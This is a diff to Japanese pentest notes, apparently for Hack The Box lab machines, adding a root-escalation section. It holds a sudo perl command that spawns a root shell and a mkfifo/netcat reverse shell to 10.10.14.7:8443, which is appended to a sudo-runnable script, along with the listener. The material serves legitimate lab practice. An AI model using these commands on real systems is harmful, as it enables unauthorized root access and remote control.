@@ -67,12 +67,25 @@ User nibbler may run the following commands on Nibbles:
 ```
 
 ## root 権限
+
+### perl -e 'exec "/bin/sh";'
 https://gtfobins.github.io/gtfobins/perl/
 ```
 shelly@Shocker:/home/shelly$ sudo perl -e 'exec "/bin/sh";'
 sudo perl -e 'exec "/bin/sh";'
 whoami
 root
+```
+
+### 
+sudo -l で root 権限で実行できるファイルを見つけ、以下コマンドで netcat できるようにする。
+```
+echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 8443 >/tmp/f' | tee -a monitor.sh
+```
+
+```
+└─$ nc -lvnp 8443
+listening on [any] 8443 ...
 ```
 
 ## Tips
